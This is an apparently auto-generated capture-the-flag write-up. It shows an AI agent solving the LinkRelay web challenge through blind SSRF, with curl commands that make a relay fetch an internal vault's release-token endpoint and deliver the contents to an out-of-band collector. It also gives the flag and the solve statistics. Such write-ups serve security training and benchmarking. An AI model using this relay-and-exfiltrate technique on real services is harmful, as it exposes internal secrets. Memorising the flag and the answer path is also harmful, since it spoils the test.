# LinkRelay [MEDIUM]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 250
- **Solves**: 5
- **Flag**: `FLAG{bl1nd-ssrf-00b-r3l4y}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.01 (winner $0.00)
- **Wall time**: 27m51s
- **Traces**: 4

## Adversarial description flags

- Flags: flag_claim
- Ground truth: Description flagged as adversarial. CTFd submit result and raw distfile bytes are authoritative. Description claims are hypotheses.

## Description

~~~
LinkRelay fetches a source URL and delivers its payload to a callback you choose.
A scratch out-of-band collector is provided in-stack for testing:
- callback target: http://sink:8080/collect
- view captures: http://chal2.hackathon.ke:8807/captures
**Flag format:** `FLAG{...}`
**Connection:** http://chal2.hackathon.ke:8007
**Collector (OOB sink):** http://chal2.hackathon.ke:8807
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | flag_found / CONFIRMED | 6 | $0.00 | 39s | `trace-LinkRelay_[MEDIUM]-deepseek-flash-20261029-124820.jsonl` |
| `deepseek-flash` | flag_found / CONFIRMED | 9 | $0.00 | 1m06s | `trace-LinkRelay_[MEDIUM]-deepseek-flash-20261029-125912.jsonl` |
| `deepseek-flash` | flag_found / CONFIRMED | 10 | $0.00 | 1m13s | `trace-LinkRelay_[MEDIUM]-deepseek-flash-20261029-131448.jsonl` |
| `claude-opus-4-6` | gave_up | 0 | $0.00 | 15s | `trace-LinkRelay_[MEDIUM]-claude-opus-4-6-20261029-131448.jsonl` |

_Window: 2026-10-29T12:48:24 to 2026-10-29T13:16:16_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt | head -50",
  "timeout_seconds": 60
}
~~~

### Step 2: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8007/ --max-time 15",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 09:48:26 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 6664

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>LinkRelay — Webhook Relay</title>
<style>
  :root{--bg:#fbf7f3;--panel:#fff;--ink:#2a1a10;--muted:#7a6a5c;--line:#efe6dc;
        --brand:#ea580c;--brand-ink:#c2410c;--brand-soft:#ffedd5;--ok:#059669;
        --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);--radius:12px;}
  *{box-sizing:border-box}html,body{margin:0;height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5;-webkit-font-smoothing:antialiased}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
  .logo{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#fb923c,#ea580c);display:grid;place-items:center;color:#fff;font-weight:800;box-shadow:var(--shadow)}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "curl -s http://chal2.hackathon.ke:8007/api/status; echo; curl -s -i http://chal2.hackathon.ke:8807/ --max-time 10 | head -30",
  "timeout_seconds": 60
}
~~~

~~~
{"note":"relay fetches a source and delivers to your callback","ok":true,"service":"linkrelay","upstreams":["http://vault:9000"]}

HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 09:48:33 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 2549

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Collector — OOB Sink</title>
<style>
  :root{--bg:#0d1117;--panel:#161b22;--ink:#e6edf3;--muted:#8b949e;--line:#30363d;--accent:#3fb950;}
  *{box-sizing:border-box}html,body{margin:0;height:100%}
  body{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;background:var(--bg);color:var(--ink);font-size:13.5px;line-height:1.55}
  header{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;border-bottom:1px solid var(--line);background:var(--panel)}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700}
  .dot{width:9px;height:9px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent)}
  .wrap{max-width:1000px;margin:24px auto;padding:0 20px}
  .meta{color:var(--muted);margin-bottom:16px}
... [1651 chars total]
~~~

### Step 4: `bash`
~~~
{
  "command": "curl -s -X POST http://chal2.hackathon.ke:8007/api/relay -H 'Content-Type: application/json' -d '{\"source\":\"http://vault:9000/\",\"callback\":\"http://sink:8080/collect\"}'; echo\ncurl -s -X POST http://chal2.hackathon.ke:8007/api/relay -H 'Content-Type: application/json' -d '{\"source\":\"http://vault:9000/\",\"callback\":\"http://chal2.hackathon.ke:8807/collect\"}'; echo\nsleep 2; curl -s http://chal2.hackathon.ke:8807/captures",
  "timeout_seconds": 60
}
~~~

~~~
{"delivered":false,"note":"callback unreachable","ok":true}

{"delivered":false,"note":"callback unreachable","ok":true}

{"captures":[{"body":"{\"captures\":[],\"count\":0}\n","method":"POST","remote":"172.25.0.3","ts":1793267213.9035444},{"body":"{\"endpoints\":[\"/healthz\",\"/v1/sample\",\"/v1/release-token\"],\"note\":\"internal metadata service \\u2014 not for external exposure\",\"service\":\"vault\",\"version\":\"v1\"}\n","method":"POST","remote":"172.25.0.3","ts":1793267331.947122},{"body":"{\"endpoints\":[\"/healthz\",\"/v1/sample\",\"/v1/release-token\"],\"note\":\"internal metadata service \\u2014 not for external exposure\",\"service\":\"vault\",\"version\":\"v1\"}\n","method":"POST","remote":"172.25.0.1","ts":1793267331.9481254}],"count":3}
~~~

### Step 5: `bash`
~~~
{
  "command": "cb=http://sink:8080/collect\nfor p in /v1/sample /v1/release-token /healthz; do\ncurl -s -X POST http://chal2.hackathon.ke:8007/api/relay -H 'Content-Type: application/json' -d \"{\\\"source\\\":\\\"http://vault:9000$p\\\",\\\"callback\\\":\\\"$cb\\\"}\"; echo \" ($p)\"; done\nsleep 2; curl -s http://chal2.hackathon.ke:8807/captures | python3 -m json.tool",
  "timeout_seconds": 60
}
~~~

~~~
{"delivered":true,"note":"relayed","ok":true}
 (/v1/sample)
{"delivered":true,"note":"relayed","ok":true}
 (/v1/release-token)
{"delivered":true,"note":"relayed","ok":true}
 (/healthz)
{
    "captures": [
        {
            "body": "{\"captures\":[],\"count\":0}\n",
            "method": "POST",
            "remote": "172.25.0.3",
            "ts": 1793267213.9035444
        },
        {
            "body": "{\"endpoints\":[\"/healthz\",\"/v1/sample\",\"/v1/release-token\"],\"note\":\"internal metadata service \\u2014 not for external exposure\",\"service\":\"vault\",\"version\":\"v1\"}\n",
            "method": "POST",
            "remote": "172.25.0.3",
            "ts": 1793267331.947122
        },
        {
            "body": "{\"endpoints\":[\"/healthz\",\"/v1/sample\",\"/v1/release-token\"],\"note\":\"internal metadata service \\u2014 not for external exposure\",\"service\":\"vault\",\"version\":\"v1\"}\n",
            "method": "POST",
            "remote": "172.25.0.1",
            "ts": 1793267331.9481254
        },
        {
            "body": "{\"note\":\"example payload shape only\",\"sample_token\":\"FAKE-FLAG{Try-Harder-Mate}\"}\n",
            "method": "POST",
... [1721 chars total]
~~~

### Step 6: `submit_flag`
~~~
{
  "flag": "FLAG{bl1nd-ssrf-00b-r3l4y}"
}
~~~

~~~
DRY RUN — would submit "FLAG{bl1nd-ssrf-00b-r3l4y}" but --no-submit is set.
~~~

## Result

- **Flag**: `FLAG{bl1nd-ssrf-00b-r3l4y}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.00 (winner), $0.01 (whole swarm)
- **Wall time**: 27m51s
- **Generated**: 2026-10-30T00:14:55
